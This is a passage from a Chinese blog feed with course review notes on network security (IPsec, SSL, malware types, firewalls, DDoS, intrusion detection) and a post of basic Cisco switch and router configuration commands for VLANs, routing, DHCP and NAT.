color=skyblue>什么是SA？SA由哪些参数来表示？（考察）</font></strong></p><ul><li><p>安全关联(SA)是IP的认证和保密机制中的核心概念，一个安全关联是发送方和接收方之间受到密码技术保护的单向关系，该关系对所携带的通信流量提供安全服务</p></li><li><p style="color:blue;">一个安全关联由3个参数确定：安全参数索引(SPI)。目标IP地址、安全协议表示</p></li></ul></li><li><p><strong><font color=skyblue>传输模式和隧道模式有何区别？（考察）</font></strong></p><ul><li>从安全性来讲，隧道模式优于传输模式。它可以完全地对原始IP数据报进行验证和加密。隧道模式下可以隐藏内部IP地址，协议类型和端口</li><li>从性能来讲，隧道模式因为有一个额外的IP头，所以它将比传输模式占用更多带宽</li><li>从场景来讲，传输模式主要应用于两台主机或一台主机和一台VPN网关之间通信；隧道模式主要应用于两台VPN网关之间或一台主机与一台VPN网关之间的通信。</li><li>当安全协议同时采用AH和ESP时，AH和ESP协议必须采用相同的封装模式。 </li></ul></li><li><p><strong><font color=skyblue>AH协议和ESP协议各自提供哪些安全服务？（考察）</font></strong></p><ul><li>IP认证头(AH)协议为IP数据包提供数据完整性校验和身份认证，还有可选择的抗重放攻击保护，但不提供数据加密服务</li><li>封装安全载荷(ESP) 协议为IP数据包提供数据完整性校验、身份认证和数据加密，还有可选择的抗重放攻击保护</li></ul></li><li><p><strong><font color=red>SSL由哪些协议组成？各自完成什么功能？（掌握 大题）</font></strong></p><ul><li>SSL不是单个的协议，而是两层协议<ul><li>SSL记录协议基于可靠的传输层协议，用来封装高层协议</li><li>高层协议主要包括SSL握手协议、修改密码参数协议、报警协议、应用数据协议（如HTTP）等</li></ul></li><li>SSL协议的功能：<ul><li>SSL记录协议：为高层协议提供基本的安全服务：保密和消息完整性</li><li>SSL握手协议：握手协议在SSL记录层之上，负责建立当前会话状态的参数</li><li>SSL修改密码规程协议：该消息将改变连接所使用的加密规约</li><li>告警协议：规定了告警的级别和告警的类型，在SSL协议执行过程中通过告警协议来显示信息交换过程中所发生的错误</li></ul></li></ul></li><li><p><strong><font color=red>描述SSL协议的基本流程。（掌握 大题）</font></strong></p><ul><li>在基本流程中，客户端A发起与服务器B的链接，然后B把自己的证书发送给A。A验证B的证书，从中提取B的公钥,然后选择一个用来计算会话秘钥的随机数，将其用B的公钥加密发送给B。基于这个随机数，双方计算出会话密钥(主秘钥)。然后通信双方使用会话秘钥对会话数据进行加密和完整性保护</li><li>P122页还有其他内容…….</li></ul></li><li><p><strong>发送时，SSL记录协议都执行了哪些操作？分别完成什么功能？</strong></p><img src="https://shierjinghuang.github.io/2022/10/30/子域名深度挖掘/SSL记录协议.png" style="zoom:50%;" /><ul><li>从上层接收要发送的数据，对信息进行分段，成若干记录，使用指定的压缩算法进行数据压缩数据（可选）；使用指定的MAC算法生成MAC；使用指定的加密算法进行数据加密；发送数据</li></ul></li><li><p><strong>简述SSL握手协议的流程。</strong></p><ul><li><p>第一阶段 安全能力的建立</p><blockquote><p>(1) 客户 → 服务器 ：client_hello                        (2) 服务器 → 客户 ：server_hello</p></blockquote></li><li><p>第二阶段 服务器认证和密钥交换</p><blockquote><p>(3) 服务器 → 客户 ：server_certificate             (4) 服务器 → 客户 ：server_key_exchange<br>(5) 服务器 → 客户 ：certificate_request           (6) 服务器 → 客户 ：server_hello_done</p></blockquote></li><li><p>第三阶段  客户认证和密钥交换</p><pre class="line-numbers language-none"><code class="language-none">(7) 客户 → 服务器 ：client_certificate(8) 客户 → 服务器 ：client_key_exchange(9) 客户 → 服务器 ：certificate_verify<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>第四阶段  结束阶段</p><pre class="line-numbers language-none"><code class="language-none">(10) 客户 → 服务器 ：change_cipher_spec(11) 客户 → 服务器 ：finished(12) 服务器 → 客户 ：change_cipher_spec(13) 服务器 → 客户 ：finished<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><h3 id="第六章-恶意代码"><a href="#第六章-恶意代码" class="headerlink" title="第六章 恶意代码"></a>第六章 恶意代码</h3><h4 id="思考题-3"><a href="#思考题-3" class="headerlink" title="思考题"></a>思考题</h4><ul><li><strong>什么是恶意代码？主要包括哪些类型？</strong><ul><li>经过存储介质和计算机网络进行传播，从一台计算机系统到另外一台计算机系统，未经授权而破坏计算机系统安全性和完整性的程序或代码</li><li>恶意代码包括：计算机病毒、木马、蠕虫、逻辑炸弹、脚本病毒、用户级RootKit、核心级RootKitd等</li></ul></li><li><strong><font color=red>计算机病毒的概念及特征是什么？ （大题或小题）</font></strong><ul><li>计算机病毒是一种人为编制的、能够对计算机正常程序的执行或数据文件造成破坏，并且能够自我复制的一组指令程序代码</li><li>其特性包括：破坏性、传染性、隐蔽性、潜伏性、多态性、不可预见性</li></ul></li><li><strong><font color=red>什么是木马？木马和病毒有哪些主要区别？</font></strong><ul><li>木马是有隐藏性的、可与远程计算机建立连接，使远程计算机能够通过网络控制本地计算机的恶意程序。 </li><li>病毒与木马的区别<ul><li>木马通常不像传统病毒那样感染文件。木马一般是以寻找后面、窃取密码和重要文件为主，还可以对计算机进行跟踪监视、控制、查看、修改资料等操作，具有很强的屏蔽性、突发性与攻击性。</li><li>传统的文件型病毒寄生于正常可执行程序体内，通过寄主程序的执行而执行，大多数木马程序都有一个独立的可执行文件</li></ul></li></ul></li><li><strong><font color=red>什么是蠕虫？蠕虫有哪些技术特性？</font></strong><ul><li>蠕虫是一种结合黑客技术和计算机病毒技术，利用系统漏洞和应用软件的漏洞，通过复制自身进行传播的、完全独立的程序代码。</li><li>蠕虫病毒具有的技术特性有：跨平台、多种攻击手段、极快的传播速度、多态性、可变形性、传输载体与零时间探测利用等特性</li></ul></li></ul><h3 id="第七章-防火墙"><a href="#第七章-防火墙" class="headerlink" title="第七章 防火墙"></a>第七章 防火墙</h3><h4 id="思考题-4"><a href="#思考题-4" class="headerlink" title="思考题"></a>思考题</h4><ul><li><strong>什么是防火墙？它有哪些功能和局限性？</strong><ul><li><del>防火墙是一个由软件和硬件组合而成的、起过滤和封锁作用的计算机或网络系统，一般部署在本地网络和外部网络之间</del>（P175定义 老师说不是这个）</li><li>防火墙是一种建立在被认为是安全可信的内部网和和被认为不太安全可信的外部网之间的访问控制机制，是安全策略的具体体现（P176 定义）</li><li>还包括屏蔽主机防火墙（单堡垒主机）、屏蔽主机防火墙（双宿堡垒主机防火墙）、屏蔽子网防火墙等</li><li>防火墙的作用是隔离风险区域和安全区域的连接，阻止不希望的或者未授权的通信进入内部网，通过边界控制强化内部网的安全，同时不会妨碍内部网对外部网的访问</li><li>防火墙的功能：访问控制功能、内容控制功能、日志功能、集中管理功能、自身安全和可用性<ul><li>访问控制功能</li><li>内容控制功能</li><li>日志功能</li><li>集中管理功能</li><li>自身安全和可用性</li></ul></li><li>防火墙的局限性<ul><li>防火墙不能防御不经由防火墙的攻击</li><li>防火墙不能防范来自内部的威胁</li><li>防火墙不能防止病毒感染的程序和文件进出内部网</li><li>防火墙不能防止数据驱动式的攻击</li></ul></li></ul></li><li><strong><font color=red>简述包过滤原理</font></strong><ul><li>将IP数据报的各种包头信息与防火墙内建规则进行比较，然后根据过滤规则有选择地阻止或允许数据包通过防火墙。</li><li>这些过滤规则也称作访问控制表(access control table)。流入数据流到达防火墙后。</li><li>防火墙就检查数据流中每个IP数据报的各种包头信息。例如源地址、目的地址、源端口、目的端口、协议类型,来确定是否允许该数据包通过。一旦该包的信息匹配了某些特征,则防火墙根据其内建规则对包进行相应的操作，选择是否接收/丢弃 策略包</li></ul></li><li><strong>状态检查技术具有哪些特点？(小题)</strong><ul><li>对用户透明，能够在OSI/RM网络层上通过IP地址和端口号过滤进出的数据包</li><li>可以在OSI/RM应用层上检查数据包内容，查看这些内容是否符合安全规则</li><li>克服了包过滤技术和代理服务技术的局限性，能够根据协议、端口及源地址、目的地址的具体情况决定数据包是否通过</li><li>对于每个安全策略允许的请求，状态监测技术启动相应的进程，可快速的确认符合授权标准的数据包，使得运行速度加快</li></ul></li><li><strong><font color=red>简述屏蔽子网防火墙的结构</font></strong><ul><li>使用了两个包过滤路由器，一个在堡垒机和internet之间，称为外部屏蔽路由器，一个在堡垒主机和内部网络之间称为内部屏蔽路由器</li><li>每一个路由器都被配置为只和堡垒主机交换流量。外部路由器使用标准过滤来限制对堡垒主机的外部访问,内部路由器则拒绝不是堡垒主机发起的进人数据包,并只把外出数据包发给堡垒主机。</li></ul></li></ul><h3 id="第八章-网络攻击与防范"><a href="#第八章-网络攻击与防范" class="headerlink" title="第八章 网络攻击与防范"></a>第八章 网络攻击与防范</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 本章考点如下</span><span class="token operator">-</span> Dos与DDos 简答题<span class="token operator">-</span> 在入侵检测上同时存在大题和小题<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="思考题-5"><a href="#思考题-5" class="headerlink" title="思考题"></a>思考题</h4><ul><li><strong><font color=red>简述网络攻击的过程？（掌握）</font></strong><ul><li>网络攻击的过程可以归纳为：隐藏自身，踩点与扫描，侵入系统并提升权限，种植后门，网络隐身五个步骤<ul><li><strong>1 隐藏自身：</strong></li><li><strong>2 踩点与扫描：</strong></li><li><strong>3 侵入系统并提升权限</strong></li><li><strong>4 种植后门：</strong></li><li><strong>5 网络隐身：</strong>在成功侵入目标主机并植入后门后需要清除登录日志及其他相关日志</li></ul></li></ul></li><li><strong>在整个DDos攻击过程中都有哪些角色？分别完成什么功能？</strong><ul><li>DDos攻击过程中涉及四种主机：攻击者，主控傀儡机，攻击傀儡机，被攻击者<ul><li>攻击者：发布实施DDos的指令，是整个DDos攻击中的主控平台</li><li>主控傀儡机：通过这些主机分别控制大量的攻击傀儡机，能够接收攻击者发来的特殊指令，而且可以把这些指令发送到攻击傀儡机上</li><li>攻击傀儡机： 攻击傀儡机是攻击的直接执行者，直接向被攻击主机发起攻击</li><li>被攻击者：是DDos攻击的直接受害者，目前多为一些大型企业的网络和数据库系统</li></ul></li></ul></li><li><strong><font color=red>简述僵尸网络的工作原理？（掌握 大题）</font></strong><ul><li>僵尸网络的概念：僵尸网络是攻击者处于恶意目的，融合传统的恶意软件，如计算机病毒，蠕虫和木马等技术，传播僵尸程序感染大量主机，并通过一对多的命令与控制信道被感染的主机所组成的叠加网络。<ul><li>僵尸网络利用其所控制的僵尸主机群发起攻击，其活动可以分为四个阶段<ol><li>感染目标主机构建僵尸网络</li><li>发布命令，控制僵尸程序</li><li>展开攻击</li><li>攻击善后，主要目的是隐藏攻击痕迹，防止被追踪溯源</li></ol></li></ul></li></ul></li><li><strong>什么是入侵检测？ 入侵检测的典型过程是什么？</strong><ul><li>入侵检测是指在计算机网络或计算机系统中若干关键点收集信息并对收集到的信息进行分析，从而判断是网络或系统中是否有违反安全策略的行为和被攻击的迹象。它是对入侵行为的发觉</li><li>入侵检测的典型过程是：信息收集、信息（数据）预处理，数据的检测分析，根据安全策略做出响应，有的还包括检测效果的评估</li></ul></li><li><strong>IDS的基本功能是什么？典型的IDS包括哪些实体？</strong><ul><li>入侵检测系统（IDS）是完成入侵检测的功能的软件、硬件的组合；是对敌对攻击在适当的时间内进行检测并做出响应的一种工具</li><li>典型的IDS包括事件生成器、事件分析器、事件数据库、响应单元、目录服务器<ul><li>事件生成器：事件生成器是采集和过滤事件数据的程序和模块，负责收集原始数据</li><li>事件分析器：事件分析器是分析事件数据和任何CIDF组件传送给他的各种数据。</li><li>事件数据库：负责存放各种数据原始数据或已加工过的数据</li><li>响应单元： 是针对分析组件所产生的分析结果，根据响应策略采取响应的行为，发出命令响应攻击</li><li>目录服务器： 用于各组件定位其他组件，以及控制其他组件传递的数据并认证其他组件的使用，以防止其他组件的使用，以防止入侵检测系统本身受到攻击。</li></ul></li></ul></li><li><strong>简述异常检测和误用检测的基本原理？</strong> <ul><li>异常检测原理： 任何一种入侵行为都由于其偏离正常或者所期望的系统和用户的活动规律而被检测出来</li><li>误用检测原理： 建立在对过去各种已知网络入侵方法和系统缺陷知识的积累之上。入侵检测系统中存储着一系列已知的入侵行为描述，当某个系统的调用与一个已知的入侵行为相匹配时，则认为是入侵行为</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;计算机网络安全思考题：&quot;&gt;&lt;a href=&quot;#计算机网络安全思考题：&quot; class=&quot;headerlink&quot; title=&quot;计算机网络安全思考题：&quot;&gt;&lt;/a&gt;计算机网络安全思考题：&lt;/h2&gt;&lt;h3 id=&quot;第一章概述&quot;&gt;&lt;a href=&quot;#第一章概述&quot; class</summary>
      
    
    
    
    <category term="网络安全" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="网络安全" scheme="https://shierjinghuang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>网络工程——CISCO设备基本语法</title>
    <link href="https://shierjinghuang.github.io/2023/02/20/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
    <id>https://shierjinghuang.github.io/2023/02/20/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</id>
    <published>2023-02-20T14:13:23.000Z</published>
    <updated>2023-03-05T10:35:20.784Z</updated>
    
    <content type="html"><![CDATA[<h2 id="网络工程——CISCO设备基本语法"><a href="#网络工程——CISCO设备基本语法" class="headerlink" title="网络工程——CISCO设备基本语法"></a>网络工程——CISCO设备基本语法</h2><p>[TOC]</p><h3 id="交换机配置："><a href="#交换机配置：" class="headerlink" title="交换机配置："></a>交换机配置：</h3><pre class="line-numbers language-none"><code class="language-none">Switch&gt;enable进入特权模式Switch#configure terminal进入全局配置模式Switch(config)#hostname S1更改用户名S1(config)#enable password ciscoS1(config)#line con 0S1(config-line)#password ciscoS1(config-line)#loginS1(config-line)#line vty 0 15S1(config-line)#password ciscoS1(config-line)#loginS1(config-line)#exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="管理配置地址："><a href="#管理配置地址：" class="headerlink" title="管理配置地址："></a>管理配置地址：</h4><pre class="line-numbers language-none"><code class="language-none">S1(config)# interface Vlan 1进入vlan 1的接口配置模式S1(if-config)# ip address 192.168.1.2 255.255.255.0设置接口IP地址与子网掩码S1(if-config)# no shutdown开启端口S1(if-config)# exitS1(config)# ip default-gateway 192.168.1.1配置默认网关IP地址S1(config)# end  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>其他交换机操作：</strong></p><blockquote><p>S1# show running-config     查看当前设备配置 </p></blockquote><blockquote><p>S1# show flash     显示<em>flash</em>存储器信息以及存储器中的IOS映象文件 </p></blockquote><blockquote><p>S1# show version     显示系统硬件的配置 </p></blockquote><p><strong>交换机Vlan划分及信息备份</strong></p><pre class="line-numbers language-none"><code class="language-none">Switch_A#vlan database进入vlan数据库模式Switch_A(vlan)#vlan 20 name VLAN20 Switch_A#configure terminalSwitch_A(config)#interface f0&#x2F;20Switch_A(config-if)#switchport mode access将端口的工作模式改为accessSwitch_A(config-if)#switchport access vlan 20指定接口所属vlan<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>保存配置及IOS到TFTP</strong></p><blockquote><p>Copy starup-config(or running-config)  tftp<br>copy flash tftp</p></blockquote><h4 id="STP与RSTP"><a href="#STP与RSTP" class="headerlink" title="STP与RSTP"></a>STP与RSTP</h4><p><strong>查看生成树</strong></p><blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python">Show spanning<span class="token operator">-</span>tree   <span class="token comment">#识别根桥、阻塞端口和转发端口</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><strong>配置快速生成树：</strong></p><blockquote><pre class="line-numbers language-none"><code class="language-none">Switch (config)# spanning-tree mode rapid-pvst  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><strong>可以通过什么方法查看交换机的生成树阻塞了那个端口？</strong></p><blockquote><p>可以通过Show spanning-tree指令查看</p></blockquote><ol><li>Disabled（禁用状态）：不转发数据帧，不学习MAC地址表，不参与生成树计算</li><li>Blocking（阻塞状态）；不转发数据帧，不学习MAC地址表，接收并处理BPDU，不发生BPDU</li><li>Listening（监听状态）：不转发数据帧，不学习MAC地址表，参与生成树计算，接收并发送BPDU</li><li>Learning（学习状态）：不转发数据帧，学习MAC地址表，参与生成树计算，接收并发送BPDU</li><li>Forwarling（转发状态）：转发数据帧，学习MAC地址表，参与生成树计算，接收并发送BPDU </li></ol><p><strong>总结生成树中根桥的选举规则</strong></p><ul><li>选择根桥的依据是网桥ID，网桥ID是唯一的，网桥ID由网桥优先级 和 网桥的MAC地址组成,网桥ID中的MAC地址是自身交换机的MAC地址</li><li>在选择根桥的时候，是依据看哪台交换机的ID值最小，优先级小的被选择为根网桥，在优先级相同的情况下，MAC地址小的为根网桥</li></ul><p><strong>更改根桥优先级</strong></p><p>所有交换机的优先级都是默认的32768，要实现变更根桥，只要将交换机的优先级更改为小于32768，同时优先级的修改以4096为增量</p><blockquote><p>在全局配置模式下执行如下命令∶spanning-tree vlan 1 priority 4096</p></blockquote><p>这样，Switch3的优先级值就变成4097，成为了网络中最小的ID，从而成为了根桥。</p><h4 id="三层交换实现VLAN间通信"><a href="#三层交换实现VLAN间通信" class="headerlink" title="三层交换实现VLAN间通信"></a>三层交换实现VLAN间通信</h4><p><strong>将端口分配给VLAN</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">config terminalinterface f0&#x2F;1switchport mode accessswitchport access vlan 10&#x2F;&#x2F;端口1分配给VLAN10exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>在交换机上给VLAN分配IP地址</strong></p><pre class="line-numbers language-none"><code class="language-none">Switch#config terminalInterface vlan 10Ip address 192.168.10.1 255.255.255.0&#x2F;&#x2F;VLAN10分配IP地址No shutdownExit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>三次交换机上为VLAN配置IP地址作用是什么？<ul><li><del><strong>vlan 上配IP就是真实的网关地址， 主要用于两台或者多台三层交换机之间进行通信</strong></del>（网络说法不一定可信）</li></ul></li><li>如何采用此种方法实现多个（超过两个）VLAN间路由？<ul><li>将二层交换机与三层交换机之间的接口设置为trunk模式，使得不同vlan可以经三层交换机实现路由</li></ul></li></ol><h3 id="路由器配置："><a href="#路由器配置：" class="headerlink" title="路由器配置："></a>路由器配置：</h3><h4 id="路由器常用命令"><a href="#路由器常用命令" class="headerlink" title="路由器常用命令"></a>路由器常用命令</h4><ul><li>Hostname    #设置交换机的主机名</li><li>Show startup-config    显示交换机初始化配置 </li><li>Show running-config    查看当前设备配置 </li><li>Show flash    显示<em>flash</em>存储器信息以及存储器中的IOS映象文件 </li><li>Show version    显示系统硬件的配置</li><li>Show interface **    命令来查察接口的信息</li><li>Show controllers **    查看接口的硬件信息 </li></ul><ol><li><p><strong>通过实验，说明如何保存路由器的启动配置 startup-config？</strong></p><blockquote><p style="color:blue;">Router# copy running-config startup-config</p></blockquote></li><li><p><strong>若将两台路由器互联，配置完各个接口的IP地址以后，两台PC是否可以ping通，为什么？在路由器上Ping另外一台路由器的互联接口是否可ping通，为什么？</strong> </p><blockquote><p style="color:blue;">不可以ping通，两台路由器之间缺少相应的路由，可以ping通，两个路由器端口直接相连。</p></blockquote></li></ol><p><strong>路由器的基本管理</strong></p><blockquote><p style="color:blue;">Router# copy running-config tftp    配置文件保存</p></blockquote><blockquote><p style="color:blue;">Router# Copy tftp running-config    配置文件恢复</p></blockquote><blockquote><p style="color:blue;">Router#copy flash tftp    保存操作系统</p></blockquote><p><strong>配置静态路由</strong></p><blockquote><p>ip route [目的网络号] [子网掩码] [下一跳IP地址]</p></blockquote><p><strong>配置默认路由：</strong></p><blockquote><p> ip route 0.0.0.0 0.0.0.0  [下一跳IP地址]</p></blockquote><ol><li><p><strong>静态路由的下一跳可以采用接口号表示，那么可以将本实验中的静态路由或默认路由写成什么表达形式？</strong></p><ul><li>可以将下一跳IP地址更换成出接口</li><li>静态路由：ip route [目的网络号] [子网掩码] [出接口]</li><li>默认路由：ip route 0.0.0.0 0.0.0.0  [出接口]</li></ul></li><li><p><strong>根据实验和路由知识，若静态路由和默认路由同时存在的话，分组路由的过程中优先选择静态路由还是默认路由？为什么？</strong></p><ul><li>静态路由。在路由表中默认路由排在最后，同时存在静态路由与默认路由时，将优先使用静态路由</li></ul></li></ol><p><strong>配置DHCP：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ip dhcp pool <span class="token punctuation">[</span>poolname<span class="token punctuation">]</span> <span class="token operator">//</span>创建地址池，名字为poolnamenetwork <span class="token number">1.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token number">255.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token operator">//</span>配置分配的网段 default<span class="token operator">-</span>router <span class="token number">1.1</span><span class="token number">.1</span><span class="token number">.1</span>   <span class="token operator">//</span>配置网关dns<span class="token operator">-</span>server <span class="token number">219.218</span><span class="token number">.18</span><span class="token number">.18</span> <span class="token operator">//</span> 配置DNS服务器的IP地址。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>PC端如何使用命令行方式释放或获取新的IP地址？（ipconfig 参数）</p><blockquote><p>ipconfig /release释放本机IP地址</p><p>ipconfig /renew，获得一个新的IP地址</p></blockquote></li><li><p>若DHCP的配置中，使用的是Network 192.168.1.0 255.255.255.0，那么R1所连接本地网络中主机获取的IP地址范围是什么？</p><ul><li>192.168.1.1到192.168.1.254 <del>（应该）</del></li></ul></li><li><p>根据实验说明：主机获取的IP地址、子网掩码、网关和DNS分别与DHCP配置中那条命令对应？</p><ul><li>network命令配置主机获取的IP地址，子网掩码，default-router配置网关，dns-server配置DNS域名解析服务器。</li></ul></li></ol><p><strong>查看DHCP状态:</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">R1#show ip dhcp binding  &#x2F;&#x2F; 查看IP分配绑定状态R1#show ip dhcp pool [poolname]   &#x2F;&#x2F; 查看dhcp地址池R1#show ip dhcp server statistics &#x2F;&#x2F; 查看dhcp服务状态<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="二层交换机与路由器实现VLAN间路由"><a href="#二层交换机与路由器实现VLAN间路由" class="headerlink" title="二层交换机与路由器实现VLAN间路由"></a>二层交换机与路由器实现VLAN间路由</h4><p><strong>在交换机上创建Trunk端口</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">interface f0&#x2F;1                       &#x2F;&#x2F;与路由器级联接口为f0&#x2F;1switchport mode trunk       &#x2F;&#x2F;封装为Trunk口end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>配置路由器子接口</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">Router#configure terminalInterface f0&#x2F;0No shutexitInterface f0&#x2F;0.10Encapsulation dot1q 10    &#x2F;&#x2F;子接口1对应VLAN 10Ip address 192.168.10.1 255.255.255.0Interface f0&#x2F;0.20Encapsulation dot1q 20Ip address 192.168.20.1 255.255.255.0    &#x2F;&#x2F;子接口2 对应VLAN 20<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>激活路由选择协议</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">Switch(config)#Ip routing<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><p>使用这种方式配置VLAN间路由的原理是什么？</p><p> 路由器的一个接口上通过配置逻辑接口或子接口的方式，<code>实现原来相互隔离的不同VLAN（虚拟局域网）之间的互联互通</code> </p></li><li><p>如果不使用子接口，而是利用路由器的两个以太网口分别连接到交换机两个不同VLAN中的接口上（PC、交换机与路由器级联接口也划分入相应的VLAN），是否能够连通？在这种情况下，路由器与交换机之间的级联接口不配置Trunk是否可以连通？</p><ul><li>可以连通， 在路由器上为每一个VLAN都配置一个物理连接后，数据流将分不同VLAN流到路由器上不同的端口中，再通过路由器进行路由的转发，以实现VLAN之间的通信。 </li></ul></li></ol><h4 id="网络地址转换NAT"><a href="#网络地址转换NAT" class="headerlink" title="网络地址转换NAT"></a>网络地址转换NAT</h4><p><strong>静态NAT：</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">interface  f0&#x2F;0ip  adddress  172.16.1.1 255.255.255.0ip  nat  inside# 定义内部接口no shutdown(config)#interface   f0&#x2F;1ip  address  202.96.134.1 255.255.255.0ip  nat  outside# 定义外部接口no shutdown(config)#ip  nat  inside  source  static 172.16.1.100   202.96.134.100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p style="color:blue;">ip nat inside source static    [本地IP地址]     [目标ip地址] # 初始于 inside 向 outside 发送，在outside接口执行源地址翻译 </blockquote><blockquote><p style="color:blue;">ip nat outside source static [global-address] [local-address]， 初始于 outside 向 inside 发送，在inside接口执行源地址翻译 </blockquote><p><strong>动态NAT配置：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">access<span class="token operator">-</span><span class="token builtin">list</span> <span class="token number">10</span> permit <span class="token number">172.16</span><span class="token number">.1</span><span class="token number">.0</span> <span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.255</span><span class="token comment"># 创造一个访问控制列表（ACL）,表号为10，内容是允许172.16.1.0 </span><span class="token comment"># access-list [表号] [permit/deny] [网络号] [反掩码]</span>ip nat pool MYNAT <span class="token number">202.96</span><span class="token number">.134</span><span class="token number">.100</span> <span class="token number">202.96</span><span class="token number">.134</span><span class="token number">.110</span> netmask <span class="token number">255.255</span><span class="token number">.255</span><span class="token number">.0</span><span class="token comment"># 配置NAT地址池的名字以及 IP地址范围、子网掩码</span>ip nat inside source <span class="token builtin">list</span> <span class="token number">10</span> pool MYNAT<span class="token comment"># 将ACL 10 匹配得内部源IP地址，转换为地址池MYNAT 中的IP</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p><strong>将静态路由换成默认路由改如何配置？如果从外网向内网私有IP发起通信，是否可以ping通？</strong></p><ul><li>不能ping通，静态NAT技术实现的就是对内部主机的隐藏</li></ul></li><li><p><strong>对第5步中：ip nat inside source list 10 pool MYNAT 命令中，如果使用参数overload，实验结果与本实验有什么区别？</strong></p><ul><li><p>使用参数overload，意味使用PAT（网络地址端口转换）技术，可将多个内部地址映射为一个合法公网地址,但以不同的协议端口号与不同的内部地址相对应 </p></li><li><p> 内部网络的所有主机均可共享一个合法外部IP地址实现对Internet的访问 </p></li><li><p> ip nat inside source list 10  pool MYNAT overload </p></li></ul><p>  <strong><del>此外内容需要在仿真上做一遍，我还没弄</del></strong></p></li></ol><h4 id="路由协议"><a href="#路由协议" class="headerlink" title="路由协议"></a>路由协议</h4><p><strong>RIP路由协议</strong></p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">Router rip# 启动RIPnetwork 1.0.0.0network 12.0.0.0 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>OSPF路由协议</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Router ospf <span class="token number">1</span><span class="token comment"># 启动ospf协议</span>Network <span class="token number">1.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token number">0.255</span><span class="token number">.255</span><span class="token number">.255</span> area <span class="token number">0</span>Network <span class="token punctuation">[</span>网络号<span class="token punctuation">]</span> <span class="token punctuation">[</span>反掩码<span class="token punctuation">]</span> <span class="token punctuation">[</span>路由区域<span class="token punctuation">]</span>Network <span class="token number">12.0</span><span class="token number">.0</span><span class="token number">.0</span> <span class="token number">0.255</span><span class="token number">.255</span><span class="token number">.255</span> area <span class="token number">0</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>检查OSPF路由协议的命令</strong></p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">Show ip ospf neighbor    &#x2F;&#x2F; 显示现在的Ospf邻居，其中包括邻居ID（Route-id)、优先级、状态、存活时间、IP地址、接口Show ip osfp interface    &#x2F;&#x2F;查看接口是否被加入到正确的区域中，该命令还可以显示各种定时器hello间隔等和邻居关系。Show ip route ospf    &#x2F;&#x2F;显示路由器知道的OSPF路由Show ip ospf database    &#x2F;&#x2F;查看OSPF数据库，包括各种LSA的数据状态Clear ip ospf <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>动态路由协议的配置主要包含哪两个步骤？</p><blockquote><p><del>配置各路由器、PC的相关配置和配置路由协议（我猜的，没找到确切答案）</del></p></blockquote></li><li><p>通过RIP协议的调试步骤，可以得出RIP路由表的默认更新时间约是多少？</p><ul><li>RIP路由协议默认更新周期是30秒</li></ul></li><li><p>OSPF协议通过那条命令可以获得路由器的ID？</p></li></ol><ul><li>show ip protocols</li></ul><ol 